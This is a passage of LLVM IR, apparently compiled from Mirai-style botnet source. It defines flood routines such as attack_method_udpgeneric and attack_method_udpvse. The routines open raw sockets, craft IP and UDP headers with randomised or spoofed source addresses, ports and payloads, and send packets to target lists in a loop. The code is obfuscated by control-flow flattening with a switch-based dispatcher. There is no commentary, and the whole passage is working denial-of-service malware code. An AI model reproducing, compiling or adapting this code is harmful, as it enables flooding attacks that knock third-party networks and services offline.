  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = bitcast %struct.sockaddr_in* %617 to %struct.sockaddr*
  store %struct.sockaddr* %618, %struct.sockaddr** %612, align 8
  %619 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %620 = load %struct.sockaddr*, %struct.sockaddr** %619, align 8
  %621 = call i64 @sendto(i32 %607, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %620, i32 16)
  store i32 1460685780, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %9, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %9, align 4
  store i32 -1573652483, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 73241473, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %625, %622, %550, %547, %543, %537, %519, %513, %512, %511, %508, %507, %506, %503, %497, %496, %495, %494, %491, %482, %473, %351, %347, %255, %246, %237, %224, %219, %210, %209, %197, %189, %185, %180, %175, %166, %145, %129, %128, %124, %123, %117, %116, %113, %107, %106, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  store i32 %69, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 333785155, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 333785155, label %first
    i32 -166572965, label %72
    i32 -1231883486, label %73
    i32 1583675784, label %77
    i32 -177817104, label %78
    i32 -1919886240, label %84
    i32 1445519298, label %87
    i32 -2089517729, label %88
    i32 -1573562797, label %94
    i32 1152427272, label %139
    i32 1594574679, label %143
    i32 1674925189, label %172
    i32 -1268102337, label %175
    i32 -1508285820, label %176
    i32 -2115532602, label %177
    i32 418166901, label %183
    i32 -758915732, label %206
    i32 -1559072880, label %227
    i32 484834537, label %231
    i32 -736232139, label %235
    i32 812853637, label %240
    i32 203659125, label %245
    i32 754905620, label %250
    i32 1664301690, label %255
    i32 1081468155, label %260
    i32 959129873, label %265
    i32 -747443937, label %269
    i32 -141562009, label %273
    i32 783900970, label %320
    i32 -896903436, label %323
    i32 -2053608228, label %324
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %70 = icmp sgt i32 %.reload, 1460
  %71 = select i1 %70, i32 -166572965, i32 -1231883486
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i16 1460, i16* %18, align 2
  store i32 -1231883486, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %74, i32* %10, align 4
  %75 = icmp eq i32 %74, -1
  %76 = select i1 %75, i32 1583675784, i32 -177817104
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -2053608228, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %79 = load i32, i32* %10, align 4
  %80 = bitcast i32* %9 to i8*
  %81 = call i32 @setsockopt(i32 %79, i32 0, i32 3, i8* %80, i32 4) #6
  %82 = icmp eq i32 %81, -1
  %83 = select i1 %82, i32 -1919886240, i32 1445519298
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  store i32 -2053608228, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -2089517729, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  %93 = select i1 %92, i32 -1573562797, i32 -1268102337
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  store i8* %95, i8** %99, align 8
  %100 = load i8**, i8*** %11, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8*, i8** %100, i64 %102
  %104 = load i8*, i8** %103, align 8
  %105 = bitcast i8* %104 to %struct.iphdr*
  store %struct.iphdr* %105, %struct.iphdr** %21, align 8
  %106 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i64 1
  %108 = bitcast %struct.iphdr* %107 to %struct.udphdr*
  store %struct.udphdr* %108, %struct.udphdr** %22, align 8
  %109 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %110 = bitcast %struct.iphdr* %109 to i8*
  %111 = load i8, i8* %110, align 4
  %112 = and i8 %111, 15
  %113 = or i8 %112, 64
  store i8 %113, i8* %110, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, -16
  %118 = or i8 %117, 5
  store i8 %118, i8* %115, align 4
  %119 = load i8, i8* %12, align 1
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 1
  store i8 %119, i8* %121, align 1
  %122 = load i16, i16* %18, align 2
  %123 = zext i16 %122 to i64
  %124 = add i64 28, %123
  %125 = trunc i64 %124 to i16
  %126 = call zeroext i16 @htons(i16 zeroext %125) #7
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 2
  store i16 %126, i16* %128, align 2
  %129 = load i16, i16* %13, align 2
  %130 = call zeroext i16 @htons(i16 zeroext %129) #7
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 3
  store i16 %130, i16* %132, align 4
  %133 = load i8, i8* %14, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 5
  store i8 %133, i8* %135, align 4
  %136 = load i8, i8* %15, align 1
  %137 = icmp ne i8 %136, 0
  %138 = select i1 %137, i32 1152427272, i32 1594574679
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %141 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 4
  store i16 %140, i16* %142, align 2
  store i32 1594574679, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 6
  store i8 17, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 8
  store i32 %146, i32* %148, align 4
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 9
  store i32 %154, i32* %156, align 4
  %157 = load i16, i16* %16, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %17, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 1
  store i16 %162, i16* %164, align 2
  %165 = load i16, i16* %18, align 2
  %166 = zext i16 %165 to i64
  %167 = add i64 8, %166
  %168 = trunc i64 %167 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  store i32 1674925189, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %9, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %9, align 4
  store i32 -2089517729, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -1508285820, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -2115532602, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = load i8, i8* %5, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp slt i32 %178, %180
  %182 = select i1 %181, i32 418166901, i32 -896903436
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8**, i8*** %11, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8*, i8** %184, i64 %186
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %23, align 8
  %189 = load i8*, i8** %23, align 8
  %190 = bitcast i8* %189 to %struct.iphdr*
  store %struct.iphdr* %190, %struct.iphdr** %24, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i64 1
  %193 = bitcast %struct.iphdr* %192 to %struct.udphdr*
  store %struct.udphdr* %193, %struct.udphdr** %25, align 8
  %194 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i64 1
  %196 = bitcast %struct.udphdr* %195 to i8*
  store i8* %196, i8** %26, align 8
  %197 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = icmp slt i32 %203, 32
  %205 = select i1 %204, i32 -758915732, i32 -1559072880
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i32 0, i32 1
  %212 = load i32, i32* %211, align 4
  %213 = call i32 @ntohl(i32 %212) #7
  %214 = call i32 @rand_next()
  %215 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i32 0, i32 2
  %220 = load i8, i8* %219, align 4
  %221 = zext i8 %220 to i32
  %222 = lshr i32 %214, %221
  %223 = add i32 %213, %222
  %224 = call i32 @htonl(i32 %223) #7
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 9
  store i32 %224, i32* %226, align 4
  store i32 -1559072880, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i32, i32* %20, align 4
  %229 = icmp eq i32 %228, -1
  %230 = select i1 %229, i32 484834537, i32 -736232139
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  store i32 -736232139, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i16, i16* %13, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  %239 = select i1 %238, i32 812853637, i32 203659125
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 3
  store i16 %242, i16* %244, align 4
  store i32 203659125, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i16, i16* %16, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %247, 65535
  %249 = select i1 %248, i32 754905620, i32 1664301690
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = call i32 @rand_next()
  %252 = trunc i32 %251 to i16
  %253 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 0
  store i16 %252, i16* %254, align 2
  store i32 1664301690, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i16, i16* %17, align 2
  %257 = zext i16 %256 to i32
  %258 = icmp eq i32 %257, 65535
  %259 = select i1 %258, i32 1081468155, i32 959129873
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = call i32 @rand_next()
  %262 = trunc i32 %261 to i16
  %263 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  store i32 959129873, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8, i8* %19, align 1
  %267 = icmp ne i8 %266, 0
  %268 = select i1 %267, i32 -747443937, i32 -141562009
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8*, i8** %26, align 8
  %271 = load i16, i16* %18, align 2
  %272 = zext i16 %271 to i32
  call void @rand_str(i8* %270, i32 %272)
  store i32 -141562009, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 0, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = bitcast %struct.iphdr* %276 to i16*
  %278 = call zeroext i16 @checksum_generic(i16* %277, i32 20)
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = bitcast %struct.udphdr* %284 to i8*
  %286 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 2
  %288 = load i16, i16* %287, align 2
  %289 = load i16, i16* %18, align 2
  %290 = zext i16 %289 to i64
  %291 = add i64 8, %290
  %292 = trunc i64 %291 to i32
  %293 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %288, i32 %292)
  %294 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 2
  %296 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %303, i32 0, i32 1
  store i16 %298, i16* %304, align 2
  %305 = load i32, i32* %10, align 4
  %306 = load i8*, i8** %23, align 8
  %307 = load i16, i16* %18, align 2
  %308 = zext i16 %307 to i64
  %309 = add i64 28, %308
  %310 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = bitcast %struct.sockaddr_in* %315 to %struct.sockaddr*
  store %struct.sockaddr* %316, %struct.sockaddr** %310, align 8
  %317 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %318 = load %struct.sockaddr*, %struct.sockaddr** %317, align 8
  %319 = call i64 @sendto(i32 %305, i8* %306, i64 %309, i32 16384, %struct.sockaddr* %318, i32 16)
  store i32 783900970, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i32, i32* %9, align 4
  %322 = add nsw i32 %321, 1
  store i32 %322, i32* %9, align 4
  store i32 -2115532602, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  store i32 -1508285820, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %323, %320, %273, %269, %265, %260, %255, %250, %245, %240, %235, %231, %227, %206, %183, %177, %176, %175, %172, %143, %139, %94, %88, %87, %84, %78, %77, %73, %72, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 171692204, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 171692204, label %first
    i32 -1492446729, label %59
    i32 552076643, label %60
    i32 -1070504276, label %66
    i32 -1575436822, label %69
    i32 -581211155, label %70
    i32 1456610822, label %76
    i32 -1017550288, label %124
    i32 591067222, label %128
    i32 -313469702, label %164
    i32 -1184235502, label %167
    i32 1651819246, label %168
    i32 2119765407, label %169
    i32 787372598, label %175
    i32 -360695106, label %195
    i32 2020467044, label %216
    i32 -919499455, label %221
    i32 2007087493, label %226
    i32 -1254114813, label %231
    i32 2074232423, label %236
    i32 1560380442, label %241
    i32 -18481764, label %246
    i32 -249591664, label %293
    i32 424038874, label %296
    i32 592899349, label %297
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %57 = icmp eq i32 %.reload, -1
  %58 = select i1 %57, i32 -1492446729, i32 552076643
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 592899349, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %61 = load i32, i32* %10, align 4
  %62 = bitcast i32* %9 to i8*
  %63 = call i32 @setsockopt(i32 %61, i32 0, i32 3, i8* %62, i32 4) #6
  %64 = icmp eq i32 %63, -1
  %65 = select i1 %64, i32 -1070504276, i32 -1575436822
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %10, align 4
  %68 = call i32 @close(i32 %67)
  store i32 592899349, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -581211155, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %9, align 4
  %72 = load i8, i8* %5, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp slt i32 %71, %73
  %75 = select i1 %74, i32 1456610822, i32 -1184235502
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call noalias i8* @calloc(i64 128, i64 1) #6
  %78 = load i8**, i8*** %11, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %78, i64 %80
  store i8* %77, i8** %81, align 8
  %82 = load i8**, i8*** %11, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
